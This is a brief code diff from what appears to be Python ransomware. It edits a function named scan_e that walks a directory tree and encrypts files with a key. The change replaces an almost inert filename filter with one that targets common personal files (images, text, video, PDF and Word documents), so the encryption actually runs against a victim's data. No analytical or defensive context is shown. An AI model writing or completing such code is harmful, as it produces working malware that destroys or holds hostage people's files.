@@ -126,7 +126,7 @@ def scan_e(APP_FOLDER):
             tDirs+=1
         for Files in files:
             tFiles+=1
-            if Files.endswith('.'):
+            if Files.endswith(('.png','.jpg','.txt','.mp4','.jpeg','.pdf','.docx')):
                 try:
                     os.chdir(base)
                     encrypt(os.path.abspath(Files),k)
